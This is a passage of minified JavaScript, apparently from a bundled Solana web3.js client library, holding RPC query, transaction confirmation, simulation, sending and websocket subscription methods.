                            commitment: e && e.commitment || this.commitment
                        } : {
                            commitment: this.commitment
                        };
                        const n = Ve(await this._rpcRequest("getSupply", [t]), Mi);
                        if ("error" in n) throw new Yr(n.error, "failed to get supply");
                        return n.result
                    }
                    async getTokenSupply(e, t) {
                        const n = this._buildArgs([e.toBase58()], t),
                            r = Ve(await this._rpcRequest("getTokenSupply", n), ci(Bi));
                        if ("error" in r) throw new Yr(r.error, "failed to get token supply");
                        return r.result
                    }
                    async getTokenAccountBalance(e, t) {
                        const n = this._buildArgs([e.toBase58()], t),
                            r = Ve(await this._rpcRequest("getTokenAccountBalance", n), ci(Bi));
                        if ("error" in r) throw new Yr(r.error, "failed to get token account balance");
                        return r.result
                    }
                    async getTokenAccountsByOwner(e, t, n) {
                        const {
                            commitment: r,
                            config: i
                        } = oi(n);
                        let o = [e.toBase58()];
                        "mint" in t ? o.push({
                            mint: t.mint.toBase58()
                        }) : o.push({
                            programId: t.programId.toBase58()
                        });
                        const s = this._buildArgs(o, r, "base64", i),
                            a = Ve(await this._rpcRequest("getTokenAccountsByOwner", s), Oi);
                        if ("error" in a) throw new Yr(a.error, `failed to get token accounts owned by account ${e.toBase58()}`);
                        return a.result
                    }
                    async getParsedTokenAccountsByOwner(e, t, n) {
                        let r = [e.toBase58()];
                        "mint" in t ? r.push({
                            mint: t.mint.toBase58()
                        }) : r.push({
                            programId: t.programId.toBase58()
                        });
                        const i = this._buildArgs(r, n, "jsonParsed"),
                            o = Ve(await this._rpcRequest("getTokenAccountsByOwner", i), Pi);
                        if ("error" in o) throw new Yr(o.error, `failed to get token accounts owned by account ${e.toBase58()}`);
                        return o.result
                    }
                    async getLargestAccounts(e) {
                        const t = { ...e,
                                commitment: e && e.commitment || this.commitment
                            },
                            n = t.filter || t.commitment ? [t] : [],
                            r = Ve(await this._rpcRequest("getLargestAccounts", n), Li);
                        if ("error" in r) throw new Yr(r.error, "failed to get largest accounts");
                        return r.result
                    }
                    async getTokenLargestAccounts(e, t) {
                        const n = this._buildArgs([e.toBase58()], t),
                            r = Ve(await this._rpcRequest("getTokenLargestAccounts", n), Ti);
                        if ("error" in r) throw new Yr(r.error, "failed to get token largest accounts");
                        return r.result
                    }
                    async getAccountInfoAndContext(e, t) {
                        const {
                            commitment: n,
                            config: r
                        } = oi(t), i = this._buildArgs([e.toBase58()], n, "base64", r), o = Ve(await this._rpcRequest("getAccountInfo", i), ci(tt(Ni)));
                        if ("error" in o) throw new Yr(o.error, `failed to get info about account ${e.toBase58()}`);
                        return o.result
                    }
                    async getParsedAccountInfo(e, t) {
                        const {
                            commitment: n,
                            config: r
                        } = oi(t), i = this._buildArgs([e.toBase58()], n, "jsonParsed", r), o = Ve(await this._rpcRequest("getAccountInfo", i), ci(tt(zi)));
                        if ("error" in o) throw new Yr(o.error, `failed to get info about account ${e.toBase58()}`);
                        return o.result
                    }
                    async getAccountInfo(e, t) {
                        try {
                            return (await this.getAccountInfoAndContext(e, t)).value
                        } catch (n) {
                            throw new Error("failed to get info about account " + e.toBase58() + ": " + n)
                        }
                    }
                    async getMultipleParsedAccounts(e, t) {
                        const {
                            commitment: n,
                            config: r
                        } = oi(t), i = e.map((e => e.toBase58())), o = this._buildArgs([i], n, "jsonParsed", r), s = Ve(await this._rpcRequest("getMultipleAccounts", o), ci(Ze(tt(zi))));
                        if ("error" in s) throw new Yr(s.error, `failed to get info for accounts ${i}`);
                        return s.result
                    }
                    async getMultipleAccountsInfoAndContext(e, t) {
                        const {
                            commitment: n,
                            config: r
                        } = oi(t), i = e.map((e => e.toBase58())), o = this._buildArgs([i], n, "base64", r), s = Ve(await this._rpcRequest("getMultipleAccounts", o), ci(Ze(tt(Ni))));
                        if ("error" in s) throw new Yr(s.error, `failed to get info for accounts ${i}`);
                        return s.result
                    }
                    async getMultipleAccountsInfo(e, t) {
                        return (await this.getMultipleAccountsInfoAndContext(e, t)).value
                    }
                    async getStakeActivation(e, t, n) {
                        const {
                            commitment: r,
                            config: i
                        } = oi(t), o = this._buildArgs([e.toBase58()], r, void 0, { ...i,
                            epoch: null != n ? n : null === i || void 0 === i ? void 0 : i.epoch
                        }), s = Ve(await this._rpcRequest("getStakeActivation", o), ui(ji));
                        if ("error" in s) throw new Yr(s.error, `failed to get Stake Activation ${e.toBase58()}`);
                        return s.result
                    }
                    async getProgramAccounts(e, t) {
                        const {
                            commitment: n,
                            config: r
                        } = oi(t), {
                            encoding: i,
                            ...o
                        } = r || {}, s = this._buildArgs([e.toBase58()], n, i || "base64", o), a = Ve(await this._rpcRequest("getProgramAccounts", s), ui(Ze(Ri)));
                        if ("error" in a) throw new Yr(a.error, `failed to get accounts owned by program ${e.toBase58()}`);
                        return a.result
                    }
                    async getParsedProgramAccounts(e, t) {
                        const {
                            commitment: n,
                            config: r
                        } = oi(t), i = this._buildArgs([e.toBase58()], n, "jsonParsed", r), o = Ve(await this._rpcRequest("getProgramAccounts", i), ui(Ze(Ui)));
                        if ("error" in o) throw new Yr(o.error, `failed to get accounts owned by program ${e.toBase58()}`);
                        return o.result
                    }
                    async confirmTransaction(e, t) {
                        let n, r;
                        if ("string" == typeof e) n = e;
                        else {
                            n = e.signature
                        }
                        try {
                            r = xe().decode(n)
                        } catch (f) {
                            throw new Error("signature must be base58 encoded: " + n)
                        }
                        ir(64 === r.length, "signature has invalid length");
                        const i = t || this.commitment;
                        let o, s, a = !1;
                        const u = new Promise(((e, t) => {
                                try {
                                    s = this.onSignature(n, ((t, n) => {
                                        s = void 0;
                                        const r = {
                                            context: n,
                                            value: t
                                        };
                                        a = !0, e({
                                            __type: cr.PROCESSED,
                                            response: r
                                        })
                                    }), i)
                                } catch (f) {
                                    t(f)
                                }
                            })),
                            c = new Promise((n => {
                                if ("string" === typeof e) {
                                    let e = this._confirmTransactionInitialTimeout || 6e4;
                                    switch (i) {
                                        case "processed":
                                        case "recent":
                                        case "single":
                                        case "confirmed":
                                        case "singleGossip":
                                            e = this._confirmTransactionInitialTimeout || 3e4
                                    }
                                    o = setTimeout((() => n({
                                        __type: cr.TIMED_OUT,
                                        timeoutMs: e
                                    })), e)
                                } else {
                                    let r = e;
                                    const i = async () => {
                                        try {
                                            return await this.getBlockHeight(t)
                                        } catch (e) {
                                            return -1
                                        }
                                    };
                                    (async () => {
                                        let e = await i();
                                        if (!a) {
                                            for (; e <= r.lastValidBlockHeight;) {
                                                if (await Sr(1e3), a) return;
                                                if (e = await i(), a) return
                                            }
                                            n({
                                                __type: cr.BLOCKHEIGHT_EXCEEDED
                                            })
                                        }
                                    })()
                                }
                            }));
                        let l;
                        try {
                            const e = await Promise.race([u, c]);
                            switch (e.__type) {
                                case cr.BLOCKHEIGHT_EXCEEDED:
                                    throw new Yn(n);
                                case cr.PROCESSED:
                                    l = e.response;
                                    break;
                                case cr.TIMED_OUT:
                                    throw new Zn(n, e.timeoutMs / 1e3)
                            }
                        } finally {
                            clearTimeout(o), s && this.removeSignatureListener(s)
                        }
                        return l
                    }
                    async getClusterNodes() {
                        const e = Ve(await this._rpcRequest("getClusterNodes", []), ui(Ze(Xi)));
                        if ("error" in e) throw new Yr(e.error, "failed to get cluster nodes");
                        return e.result
                    }
                    async getVoteAccounts(e) {
                        const t = this._buildArgs([], e),
                            n = Ve(await this._rpcRequest("getVoteAccounts", t), eo);
                        if ("error" in n) throw new Yr(n.error, "failed to get vote accounts");
                        return n.result
                    }
                    async getSlot(e) {
                        const {
                            commitment: t,
                            config: n
                        } = oi(e), r = this._buildArgs([], t, void 0, n), i = Ve(await this._rpcRequest("getSlot", r), ui(nt()));
                        if ("error" in i) throw new Yr(i.error, "failed to get slot");
                        return i.result
                    }
                    async getSlotLeader(e) {
                        const {
                            commitment: t,
                            config: n
                        } = oi(e), r = this._buildArgs([], t, void 0, n), i = Ve(await this._rpcRequest("getSlotLeader", r), ui(ot()));
                        if ("error" in i) throw new Yr(i.error, "failed to get slot leader");
                        return i.result
                    }
                    async getSlotLeaders(e, t) {
                        const n = [e, t],
                            r = Ve(await this._rpcRequest("getSlotLeaders", n), ui(Ze(ti)));
                        if ("error" in r) throw new Yr(r.error, "failed to get slot leaders");
                        return r.result
                    }
                    async getSignatureStatus(e, t) {
                        const {
                            context: n,
                            value: r
                        } = await this.getSignatureStatuses([e], t);
                        ir(1 === r.length);
                        return {
                            context: n,
                            value: r[0]
                        }
                    }
                    async getSignatureStatuses(e, t) {
                        const n = [e];
                        t && n.push(t);
                        const r = Ve(await this._rpcRequest("getSignatureStatuses", n), ro);
                        if ("error" in r) throw new Yr(r.error, "failed to get signature status");
                        return r.result
                    }
                    async getTransactionCount(e) {
                        const {
                            commitment: t,
                            config: n
                        } = oi(e), r = this._buildArgs([], t, void 0, n), i = Ve(await this._rpcRequest("getTransactionCount", r), ui(nt()));
                        if ("error" in i) throw new Yr(i.error, "failed to get transaction count");
                        return i.result
                    }
                    async getTotalSupply(e) {
                        return (await this.getSupply({
                            commitment: e,
                            excludeNonCirculatingAccountsList: !0
                        })).value.total
                    }
                    async getInflationGovernor(e) {
                        const t = this._buildArgs([], e),
                            n = Ve(await this._rpcRequest("getInflationGovernor", t), _i);
                        if ("error" in n) throw new Yr(n.error, "failed to get inflation");
                        return n.result
                    }
                    async getInflationReward(e, t, n) {
                        const {
                            commitment: r,
                            config: i
                        } = oi(n), o = this._buildArgs([e.map((e => e.toBase58()))], r, void 0, { ...i,
                            epoch: null != t ? t : null === i || void 0 === i ? void 0 : i.epoch
                        }), s = Ve(await this._rpcRequest("getInflationReward", o), di);
                        if ("error" in s) throw new Yr(s.error, "failed to get inflation reward");
                        return s.result
                    }
                    async getEpochInfo(e) {
                        const {
                            commitment: t,
                            config: n
                        } = oi(e), r = this._buildArgs([], t, void 0, n), i = Ve(await this._rpcRequest("getEpochInfo", r), Ei);
                        if ("error" in i) throw new Yr(i.error, "failed to get epoch info");
                        return i.result
                    }
                    async getEpochSchedule() {
                        const e = Ve(await this._rpcRequest("getEpochSchedule", []), Si);
                        if ("error" in e) throw new Yr(e.error, "failed to get epoch schedule");
                        const t = e.result;
                        return new Vr(t.slotsPerEpoch, t.leaderScheduleSlotOffset, t.warmup, t.firstNormalEpoch, t.firstNormalSlot)
                    }
                    async getLeaderSchedule() {
                        const e = Ve(await this._rpcRequest("getLeaderSchedule", []), Ii);
                        if ("error" in e) throw new Yr(e.error, "failed to get leader schedule");
                        return e.result
                    }
                    async getMinimumBalanceForRentExemption(e, t) {
                        const n = this._buildArgs([e], t),
                            r = Ve(await this._rpcRequest("getMinimumBalanceForRentExemption", n), io);
                        return "error" in r ? (console.warn("Unable to fetch minimum balance for rent exemption"), 0) : r.result
                    }
                    async getRecentBlockhashAndContext(e) {
                        const t = this._buildArgs([], e),
                            n = Ve(await this._rpcRequest("getRecentBlockhash", t), _o);
                        if ("error" in n) throw new Yr(n.error, "failed to get recent blockhash");
                        return n.result
                    }
                    async getRecentPerformanceSamples(e) {
                        const t = Ve(await this._rpcRequest("getRecentPerformanceSamples", e ? [e] : []), So);
                        if ("error" in t) throw new Yr(t.error, "failed to get recent performance samples");
                        return t.result
                    }
                    async getFeeCalculatorForBlockhash(e, t) {
                        const n = this._buildArgs([e], t),
                            r = Ve(await this._rpcRequest("getFeeCalculatorForBlockhash", n), Io);
                        if ("error" in r) throw new Yr(r.error, "failed to get fee calculator");
                        const {
                            context: i,
                            value: o
                        } = r.result;
                        return {
                            context: i,
                            value: null !== o ? o.feeCalculator : null
                        }
                    }
                    async getFeeForMessage(e, t) {
                        const n = e.serialize().toString("base64"),
                            r = this._buildArgs([n], t),
                            i = Ve(await this._rpcRequest("getFeeForMessage", r), ci(tt(nt())));
                        if ("error" in i) throw new Yr(i.error, "failed to get fee for message");
                        if (null === i.result) throw new Error("invalid blockhash");
                        return i.result
                    }
                    async getRecentBlockhash(e) {
                        try {
                            return (await this.getRecentBlockhashAndContext(e)).value
                        } catch (t) {
                            throw new Error("failed to get recent blockhash: " + t)
                        }
                    }
                    async getLatestBlockhash(e) {
                        try {
                            return (await this.getLatestBlockhashAndContext(e)).value
                        } catch (t) {
                            throw new Error("failed to get recent blockhash: " + t)
                        }
                    }
                    async getLatestBlockhashAndContext(e) {
                        const {
                            commitment: t,
                            config: n
                        } = oi(e), r = this._buildArgs([], t, void 0, n), i = Ve(await this._rpcRequest("getLatestBlockhash", r), Eo);
                        if ("error" in i) throw new Yr(i.error, "failed to get latest blockhash");
                        return i.result
                    }
                    async getVersion() {
                        const e = Ve(await this._rpcRequest("getVersion", []), ui(vi));
                        if ("error" in e) throw new Yr(e.error, "failed to get version");
                        return e.result
                    }
                    async getGenesisHash() {
                        const e = Ve(await this._rpcRequest("getGenesisHash", []), ui(ot()));
                        if ("error" in e) throw new Yr(e.error, "failed to get genesis hash");
                        return e.result
                    }
                    async getBlock(e, t) {
                        const {
                            commitment: n,
                            config: r
                        } = oi(t), i = this._buildArgsAtLeastConfirmed([e], n, void 0, r), o = Ve(await this._rpcRequest("getBlock", i), mo);
                        if ("error" in o) throw new Yr(o.error, "failed to get confirmed block");
                        const s = o.result;
                        return s ? { ...s,
                            transactions: s.transactions.map((e => {
                                let {
                                    transaction: t,
                                    meta: n,
                                    version: r
                                } = e;
                                return {
                                    meta: n,
                                    transaction: { ...t,
                                        message: fi(r, t.message)
                                    },
                                    version: r
                                }
                            }))
                        } : s
                    }
                    async getParsedBlock(e, t) {
                        const {
                            commitment: n,
                            config: r
                        } = oi(t), i = this._buildArgsAtLeastConfirmed([e], n, "jsonParsed", r), o = Ve(await this._rpcRequest("getBlock", i), wo);
                        if ("error" in o) throw new Yr(o.error, "failed to get block");
                        return o.result
                    }
                    async getBlockHeight(e) {
                        const {
                            commitment: t,
                            config: n
                        } = oi(e), r = this._buildArgs([], t, void 0, n), i = Ve(await this._rpcRequest("getBlockHeight", r), ui(nt()));
                        if ("error" in i) throw new Yr(i.error, "failed to get block height information");
                        return i.result
                    }
                    async getBlockProduction(e) {
                        let t, n;
                        if ("string" === typeof e) n = e;
                        else if (e) {
                            const {
                                commitment: r,
                                ...i
                            } = e;
                            n = r, t = i
                        }
                        const r = this._buildArgs([], n, "base64", t),
                            i = Ve(await this._rpcRequest("getBlockProduction", r), ki);
                        if ("error" in i) throw new Yr(i.error, "failed to get block production information");
                        return i.result
                    }
                    async getTransaction(e, t) {
                        const {
                            commitment: n,
                            config: r
                        } = oi(t), i = this._buildArgsAtLeastConfirmed([e], n, void 0, r), o = Ve(await this._rpcRequest("getTransaction", i), Ao);
                        if ("error" in o) throw new Yr(o.error, "failed to get transaction");
                        const s = o.result;
                        return s ? { ...s,
                            transaction: { ...s.transaction,
                                message: fi(s.version, s.transaction.message)
                            }
                        } : s
                    }
                    async getParsedTransaction(e, t) {
                        const {
                            commitment: n,
                            config: r
                        } = oi(t), i = this._buildArgsAtLeastConfirmed([e], n, "jsonParsed", r), o = Ve(await this._rpcRequest("getTransaction", i), ko);
                        if ("error" in o) throw new Yr(o.error, "failed to get transaction");
                        return o.result
                    }
                    async getParsedTransactions(e, t) {
                        const {
                            commitment: n,
                            config: r
                        } = oi(t), i = e.map((e => ({
                            methodName: "getTransaction",
                            args: this._buildArgsAtLeastConfirmed([e], n, "jsonParsed", r)
                        })));
                        return (await this._rpcBatchRequest(i)).map((e => {
                            const t = Ve(e, ko);
                            if ("error" in t) throw new Yr(t.error, "failed to get transactions");
                            return t.result
                        }))
                    }
                    async getTransactions(e, t) {
                        const {
                            commitment: n,
                            config: r
                        } = oi(t), i = e.map((e => ({
                            methodName: "getTransaction",
                            args: this._buildArgsAtLeastConfirmed([e], n, void 0, r)
                        })));
                        return (await this._rpcBatchRequest(i)).map((e => {
                            const t = Ve(e, Ao);
                            if ("error" in t) throw new Yr(t.error, "failed to get transactions");
                            const n = t.result;
                            return n ? { ...n,
                                transaction: { ...n.transaction,
                                    message: fi(n.version, n.transaction.message)
                                }
                            } : n
                        }))
                    }
                    async getConfirmedBlock(e, t) {
                        const n = this._buildArgsAtLeastConfirmed([e], t),
                            r = Ve(await this._rpcRequest("getConfirmedBlock", n), bo);
                        if ("error" in r) throw new Yr(r.error, "failed to get confirmed block");
                        const i = r.result;
                        if (!i) throw new Error("Confirmed block " + e + " not found");
                        const o = { ...i,
                            transactions: i.transactions.map((e => {
                                let {
                                    transaction: t,
                                    meta: n
                                } = e;
                                const r = new sr(t.message);
                                return {
                                    meta: n,
                                    transaction: { ...t,
                                        message: r
                                    }
                                }
                            }))
                        };
                        return { ...o,
                            transactions: o.transactions.map((e => {
                                let {
                                    transaction: t,
                                    meta: n
                                } = e;
                                return {
                                    meta: n,
                                    transaction: hr.populate(t.message, t.signatures)
                                }
                            }))
                        }
                    }
                    async getBlocks(e, t, n) {
                        const r = this._buildArgsAtLeastConfirmed(void 0 !== t ? [e, t] : [e], n),
                            i = Ve(await this._rpcRequest("getBlocks", r), ui(Ze(nt())));
                        if ("error" in i) throw new Yr(i.error, "failed to get blocks");
                        return i.result
                    }
                    async getBlockSignatures(e, t) {
                        const n = this._buildArgsAtLeastConfirmed([e], t, void 0, {
                                transactionDetails: "signatures",
                                rewards: !1
                            }),
                            r = Ve(await this._rpcRequest("getBlock", n), vo);
                        if ("error" in r) throw new Yr(r.error, "failed to get block");
                        const i = r.result;
                        if (!i) throw new Error("Block " + e + " not found");
                        return i
                    }
                    async getConfirmedBlockSignatures(e, t) {
                        const n = this._buildArgsAtLeastConfirmed([e], t, void 0, {
                                transactionDetails: "signatures",
                                rewards: !1
                            }),
                            r = Ve(await this._rpcRequest("getConfirmedBlock", n), vo);
                        if ("error" in r) throw new Yr(r.error, "failed to get confirmed block");
                        const i = r.result;
                        if (!i) throw new Error("Confirmed block " + e + " not found");
                        return i
                    }
                    async getConfirmedTransaction(e, t) {
                        const n = this._buildArgsAtLeastConfirmed([e], t),
                            r = Ve(await this._rpcRequest("getConfirmedTransaction", n), Ao);
                        if ("error" in r) throw new Yr(r.error, "failed to get transaction");
                        const i = r.result;
                        if (!i) return i;
                        const o = new sr(i.transaction.message),
                            s = i.transaction.signatures;
                        return { ...i,
                            transaction: hr.populate(o, s)
                        }
                    }
                    async getParsedConfirmedTransaction(e, t) {
                        const n = this._buildArgsAtLeastConfirmed([e], t, "jsonParsed"),
                            r = Ve(await this._rpcRequest("getConfirmedTransaction", n), ko);
                        if ("error" in r) throw new Yr(r.error, "failed to get confirmed transaction");
                        return r.result
                    }
                    async getParsedConfirmedTransactions(e, t) {
                        const n = e.map((e => ({
                            methodName: "getConfirmedTransaction",
                            args: this._buildArgsAtLeastConfirmed([e], t, "jsonParsed")
                        })));
                        return (await this._rpcBatchRequest(n)).map((e => {
                            const t = Ve(e, ko);
                            if ("error" in t) throw new Yr(t.error, "failed to get confirmed transactions");
                            return t.result
                        }))
                    }
                    async getConfirmedSignaturesForAddress(e, t, n) {
                        let r = {},
                            i = await this.getFirstAvailableBlock();
                        for (; !("until" in r) && !(--t <= 0 || t < i);) try {
                            const e = await this.getConfirmedBlockSignatures(t, "finalized");
                            e.signatures.length > 0 && (r.until = e.signatures[e.signatures.length - 1].toString())
                        } catch (s) {
                            if (s instanceof Error && s.message.includes("skipped")) continue;
                            throw s
                        }
                        let o = await this.getSlot("finalized");
                        for (; !("before" in r) && !(++n > o);) try {
                            const e = await this.getConfirmedBlockSignatures(n);
                            e.signatures.length > 0 && (r.before = e.signatures[e.signatures.length - 1].toString())
                        } catch (s) {
                            if (s instanceof Error && s.message.includes("skipped")) continue;
                            throw s
                        }
                        return (await this.getConfirmedSignaturesForAddress2(e, r)).map((e => e.signature))
                    }
                    async getConfirmedSignaturesForAddress2(e, t, n) {
                        const r = this._buildArgsAtLeastConfirmed([e.toBase58()], n, void 0, t),
                            i = Ve(await this._rpcRequest("getConfirmedSignaturesForAddress2", r), Fi);
                        if ("error" in i) throw new Yr(i.error, "failed to get confirmed signatures for address");
                        return i.result
                    }
                    async getSignaturesForAddress(e, t, n) {
                        const r = this._buildArgsAtLeastConfirmed([e.toBase58()], n, void 0, t),
                            i = Ve(await this._rpcRequest("getSignaturesForAddress", r), Hi);
                        if ("error" in i) throw new Yr(i.error, "failed to get signatures for address");
                        return i.result
                    }
                    async getAddressLookupTable(e, t) {
                        const {
                            context: n,
                            value: r
                        } = await this.getAccountInfoAndContext(e, t);
                        let i = null;
                        return null !== r && (i = new Jr({
                            key: e,
                            state: Jr.deserialize(r.data)
                        })), {
                            context: n,
                            value: i
                        }
                    }
                    async getNonceAndContext(e, t) {
                        const {
                            context: n,
                            value: r
                        } = await this.getAccountInfoAndContext(e, t);
                        let i = null;
                        return null !== r && (i = Or.fromAccountData(r.data)), {
                            context: n,
                            value: i
                        }
                    }
                    async getNonce(e, t) {
                        return await this.getNonceAndContext(e, t).then((e => e.value)).catch((t => {
                            throw new Error("failed to get nonce for account " + e.toBase58() + ": " + t)
                        }))
                    }
                    async requestAirdrop(e, t) {
                        const n = Ve(await this._rpcRequest("requestAirdrop", [e.toBase58(), t]), xo);
                        if ("error" in n) throw new Yr(n.error, `airdrop to ${e.toBase58()} failed`);
                        return n.result
                    }
                    async _blockhashWithExpiryBlockHeight(e) {
                        if (!e) {
                            for (; this._pollingBlockhash;) await Sr(100);
                            const e = Date.now() - this._blockhashInfo.lastFetch >= ii;
                            if (null !== this._blockhashInfo.latestBlockhash && !e) return this._blockhashInfo.latestBlockhash
                        }
                        return await this._pollNewBlockhash()
                    }
                    async _pollNewBlockhash() {
                        this._pollingBlockhash = !0;
                        try {
                            const e = Date.now(),
                                t = this._blockhashInfo.latestBlockhash,
                                n = t ? t.blockhash : null;
                            for (let r = 0; r < 50; r++) {
                                const e = await this.getLatestBlockhash("finalized");
                                if (n !== e.blockhash) return this._blockhashInfo = {
                                    latestBlockhash: e,
                                    lastFetch: Date.now(),
                                    transactionSignatures: [],
                                    simulatedSignatures: []
                                }, e;
                                await Sr(200)
                            }
                            throw new Error(`Unable to obtain a new blockhash after ${Date.now()-e}ms`)
                        } finally {
                            this._pollingBlockhash = !1
                        }
                    }
                    async getStakeMinimumDelegation(e) {
                        const {
                            commitment: t,
                            config: n
                        } = oi(e), r = this._buildArgs([], t, "base64", n), i = Ve(await this._rpcRequest("getStakeMinimumDelegation", r), ci(nt()));
                        if ("error" in i) throw new Yr(i.error, "failed to get stake minimum delegation");
                        return i.result
                    }
                    async simulateTransaction(e, t, n) {
                        if ("message" in e) {
                            const i = e.serialize(),
                                o = r.lW.from(i).toString("base64");
                            if (Array.isArray(t) || void 0 !== n) throw new Error("Invalid arguments");
                            const s = t || {};
                            s.encoding = "base64", "commitment" in s || (s.commitment = this.commitment);
                            const a = [o, s],
                                u = Ve(await this._rpcRequest("simulateTransaction", a), Ai);
                            if ("error" in u) throw new Error("failed to simulate transaction: " + u.error.message);
                            return u.result
                        }
                        let i;
                        if (e instanceof hr) {
                            let t = e;
                            i = new hr, i.feePayer = t.feePayer, i.instructions = e.instructions, i.nonceInfo = t.nonceInfo, i.signatures = t.signatures
                        } else i = hr.populate(e), i._message = i._json = void 0;
                        if (void 0 !== t && !Array.isArray(t)) throw new Error("Invalid arguments");
                        const o = t;
                        if (i.nonceInfo && o) i.sign(...o);
                        else {
                            let e = this._disableBlockhashCaching;
                            for (;;) {
                                const t = await this._blockhashWithExpiryBlockHeight(e);
                                if (i.lastValidBlockHeight = t.lastValidBlockHeight, i.recentBlockhash = t.blockhash, !o) break;
                                if (i.sign(...o), !i.signature) throw new Error("!signature");
                                const n = i.signature.toString("base64");
                                if (!this._blockhashInfo.simulatedSignatures.includes(n) && !this._blockhashInfo.transactionSignatures.includes(n)) {
                                    this._blockhashInfo.simulatedSignatures.push(n);
                                    break
                                }
                                e = !0
                            }
                        }
                        const s = i._compile(),
                            a = s.serialize(),
                            u = i._serialize(a).toString("base64"),
                            c = {
                                encoding: "base64",
                                commitment: this.commitment
                            };
                        if (n) {
                            const e = (Array.isArray(n) ? n : s.nonProgramIds()).map((e => e.toBase58()));
                            c.accounts = {
                                encoding: "base64",
                                addresses: e
                            }
                        }
                        o && (c.sigVerify = !0);
                        const l = [u, c],
                            f = Ve(await this._rpcRequest("simulateTransaction", l), Ai);
                        if ("error" in f) {
                            let e;
                            if ("data" in f.error && (e = f.error.data.logs, e && Array.isArray(e))) {
                                const t = "\n    ",
                                    n = t + e.join(t);
                                console.error(f.error.message, n)
                            }
                            throw new Qr("failed to simulate transaction: " + f.error.message, e)
                        }
                        return f.result
                    }
                    async sendTransaction(e, t, n) {
                        if ("version" in e) {
                            if (t && Array.isArray(t)) throw new Error("Invalid arguments");
                            const r = e.serialize();
                            return await this.sendRawTransaction(r, n)
                        }
                        if (void 0 === t || !Array.isArray(t)) throw new Error("Invalid arguments");
                        const r = t;
                        if (e.nonceInfo) e.sign(...r);
                        else {
                            let t = this._disableBlockhashCaching;
                            for (;;) {
                                const n = await this._blockhashWithExpiryBlockHeight(t);
                                if (e.lastValidBlockHeight = n.lastValidBlockHeight, e.recentBlockhash = n.blockhash, e.sign(...r), !e.signature) throw new Error("!signature");
                                const i = e.signature.toString("base64");
                                if (!this._blockhashInfo.transactionSignatures.includes(i)) {
                                    this._blockhashInfo.transactionSignatures.push(i);
                                    break
                                }
                                t = !0
                            }
                        }
                        const i = e.serialize();
                        return await this.sendRawTransaction(i, n)
                    }
                    async sendRawTransaction(e, t) {
                        const n = Rn(e).toString("base64");
                        return await this.sendEncodedTransaction(n, t)
                    }
                    async sendEncodedTransaction(e, t) {
                        const n = {
                                encoding: "base64"
                            },
                            r = t && t.skipPreflight,
                            i = t && t.preflightCommitment || this.commitment;
                        t && null != t.maxRetries && (n.maxRetries = t.maxRetries), t && null != t.minContextSlot && (n.minContextSlot = t.minContextSlot), r && (n.skipPreflight = r), i && (n.preflightCommitment = i);
                        const o = [e, n],
                            s = Ve(await this._rpcRequest("sendTransaction", o), Mo);
                        if ("error" in s) {
                            let e;
                            throw "data" in s.error && (e = s.error.data.logs), new Qr("failed to send transaction: " + s.error.message, e)
                        }
                        return s.result
                    }
                    _wsOnOpen() {
                        this._rpcWebSocketConnected = !0, this._rpcWebSocketHeartbeat = setInterval((() => {
                            this._rpcWebSocket.notify("ping").catch((() => {}))
                        }), 5e3), this._updateSubscriptions()
                    }
                    _wsOnError(e) {
                        this._rpcWebSocketConnected = !1, console.error("ws error:", e.message)
                    }
                    _wsOnClose(e) {
                        this._rpcWebSocketConnected = !1, this._rpcWebSocketGeneration = (this._rpcWebSocketGeneration + 1) % Number.MAX_SAFE_INTEGER, this._rpcWebSocketIdleTimeout && (clearTimeout(this._rpcWebSocketIdleTimeout), this._rpcWebSocketIdleTimeout = null), this._rpcWebSocketHeartbeat && (clearInterval(this._rpcWebSocketHeartbeat), this._rpcWebSocketHeartbeat = null), 1e3 !== e ? (this._subscriptionCallbacksByServerSubscriptionId = {}, Object.entries(this._subscriptionsByHash).forEach((e => {
                            let [t, n] = e;
                            this._subscriptionsByHash[t] = { ...n,
                                state: "pending"
                            }
                        }))) : this._updateSubscriptions()
                    }
                    async _updateSubscriptions() {
                        if (0 === Object.keys(this._subscriptionsByHash).length) return void(this._rpcWebSocketConnected && (this._rpcWebSocketConnected = !1, this._rpcWebSocketIdleTimeout = setTimeout((() => {
                            this._rpcWebSocketIdleTimeout = null;
                            try {
                                this._rpcWebSocket.close()
                            } catch (e) {
                                e instanceof Error && console.log(`Error when closing socket connection: ${e.message}`)
                            }
                        }), 500)));
                        if (null !== this._rpcWebSocketIdleTimeout && (clearTimeout(this._rpcWebSocketIdleTimeout), this._rpcWebSocketIdleTimeout = null, this._rpcWebSocketConnected = !0), !this._rpcWebSocketConnected) return void this._rpcWebSocket.connect();
                        const e = this._rpcWebSocketGeneration,
                            t = () => e === this._rpcWebSocketGeneration;
                        await Promise.all(Object.keys(this._subscriptionsByHash).map((async e => {
                            const n = this._subscriptionsByHash[e];
                            if (void 0 !== n) switch (n.state) {
                                case "pending":
                                case "unsubscribed":
                                    if (0 === n.callbacks.size) return delete this._subscriptionsByHash[e], "unsubscribed" === n.state && delete this._subscriptionCallbacksByServerSubscriptionId[n.serverSubscriptionId], void await this._updateSubscriptions();
                                    await (async () => {
                                        const {
                                            args: r,
                                            method: i
                                        } = n;
                                        try {
                                            this._subscriptionsByHash[e] = { ...n,
                                                state: "subscribing"
                                            };
                                            const t = await this._rpcWebSocket.call(i, r);
                                            this._subscriptionsByHash[e] = { ...n,
                                                serverSubscriptionId: t,
                                                state: "subscribed"
                                            }, this._subscriptionCallbacksByServerSubscriptionId[t] = n.callbacks, await this._updateSubscriptions()
                                        } catch (o) {
                                            if (o instanceof Error && console.error(`${i} error for argument`, r, o.message), !t()) return;
                                            this._subscriptionsByHash[e] = { ...n,
                                                state: "pending"
                                            }, await this._updateSubscriptions()
                                        }
                                    })();
                                    break;
                                case "subscribed":
                                    0 === n.callbacks.size && await (async () => {
                                        const {
                                            serverSubscriptionId: r,
                                            unsubscribeMethod: i
                                        } = n;
                                        if (this._subscriptionsAutoDisposedByRpc.has(r)) this._subscriptionsAutoDisposedByRpc.delete(r);
                                        else {
                                            this._subscriptionsByHash[e] = { ...n,
                                                state: "unsubscribing"
                                            };
                                            try {
                                                await this._rpcWebSocket.call(i, [r])
                                            } catch (o) {
                                                if (o instanceof Error && console.error(`${i} error:`, o.message), !t()) return;
                                                return this._subscriptionsByHash[e] = { ...n,
                                                    state: "subscribed"
                                                }, void await this._updateSubscriptions()
                                            }
                                        }
                                        this._subscriptionsByHash[e] = { ...n,
                                            state: "unsubscribed"
                                        }, await this._updateSubscriptions()
                                    })()
                            }
                        })))
                    }
                    _handleServerNotification(e, t) {
                        const n = this._subscriptionCallbacksByServerSubscriptionId[e];
                        void 0 !== n && n.forEach((e => {
                            try {
                                e(...t)
                            } catch (n) {
